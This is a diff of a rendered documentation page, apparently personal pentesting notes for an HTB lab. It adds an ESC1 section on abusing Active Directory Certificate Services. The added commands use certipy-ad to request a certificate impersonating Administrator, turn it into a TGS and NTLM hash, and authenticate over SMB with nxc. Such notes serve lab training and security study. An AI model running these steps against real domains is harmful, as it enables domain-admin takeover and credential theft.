@@ -3740,6 +3740,30 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exploit
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Exploit">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#esc1" class="md-nav__link">
+    <span class="md-ellipsis">
+      ESC1
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
     </ul>
   
 </nav>
@@ -3844,6 +3868,30 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exploit
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Exploit">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#esc1" class="md-nav__link">
+    <span class="md-ellipsis">
+      ESC1
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
     </ul>
   
 </nav>
@@ -3885,7 +3933,20 @@ Powershell
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-D<span class="w"> </span><span class="s2">&quot;CN=svc-ldapuser,CN=Users,DC=certified,DC=htb&quot;</span><span class="w"> </span>-w<span class="w"> </span><span class="s1">&#39;SuperSecretPass&#39;</span><span class="w"> </span>-b<span class="w"> </span><span class="s2">&quot;DC=certified,DC=htb&quot;</span><span class="w"> </span><span class="s2">&quot;(&amp;(objectClass=pKIEnrollmentService))&quot;</span><span class="w"> </span>-H<span class="w"> </span>ldap://10.129.229.25
 </span></code></pre></div>
 <strong>Certipy</strong>
-<div class="language-C highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="n">certipy</span><span class="w"> </span><span class="n">find</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="err">&#39;</span><span class="n">user</span><span class="err">@</span><span class="n">domain</span><span class="p">.</span><span class="n">local</span><span class="err">&#39;</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="err">&#39;</span><span class="n">Password123</span><span class="o">!</span><span class="err">&#39;</span><span class="w"> </span><span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span><span class="w"> </span><span class="o">&lt;</span><span class="n">IP</span><span class="o">&gt;</span><span class="w"> </span><span class="o">-</span><span class="n">vulnerable</span><span class="w"> </span><span class="o">-</span><span class="n">stdout</span>
+<div class="language-C highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="n">certipy</span><span class="o">-</span><span class="n">ad</span><span class="w"> </span><span class="n">find</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="err">&#39;</span><span class="n">user</span><span class="err">@</span><span class="n">domain</span><span class="p">.</span><span class="n">local</span><span class="err">&#39;</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="err">&#39;</span><span class="n">Password123</span><span class="o">!</span><span class="err">&#39;</span><span class="w"> </span><span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span><span class="w"> </span><span class="o">&lt;</span><span class="n">IP</span><span class="o">&gt;</span><span class="w"> </span><span class="o">-</span><span class="n">vulnerable</span><span class="w"> </span><span class="o">-</span><span class="n">stdout</span>
+</span></code></pre></div></p>
+<h2 id="exploit">Exploit</h2>
+<hr />
+<h3 id="esc1">ESC1</h3>
+<p>If a template is vulnerable to ESC1, certipy can automatically exploit it.
+Request the Administrators certificate:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>certipy-ad<span class="w"> </span>req<span class="w"> </span>-u<span class="w"> </span>&lt;user&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;password&gt;<span class="w"> </span>-dc-ip<span class="w"> </span>&lt;IP&gt;<span class="w"> </span>-template<span class="w"> </span>&lt;Template<span class="w"> </span>Name&gt;<span class="w"> </span>-upn<span class="w"> </span>Administrator@certified.htb<span class="w"> </span>-ca<span class="w"> </span>&lt;Certificate<span class="w"> </span>Authorities&gt;<span class="w"> </span>-target<span class="w"> </span>dc.domain.local
+</span></code></pre></div>
+Request TGS &amp; NTLM hash with certificate:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>certipy-ad<span class="w"> </span>auth<span class="w"> </span>-pfx<span class="w"> </span>administrator.pfx<span class="w"> </span>-dc-ip<span class="w"> </span>&lt;IP&gt;
+</span></code></pre></div>
+Or with NXC:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span>&lt;IP&gt;<span class="w"> </span>--pfx-cert<span class="w"> </span>administrator.pfx<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;Administrator&#39;</span>
 </span></code></pre></div></p>
 
 
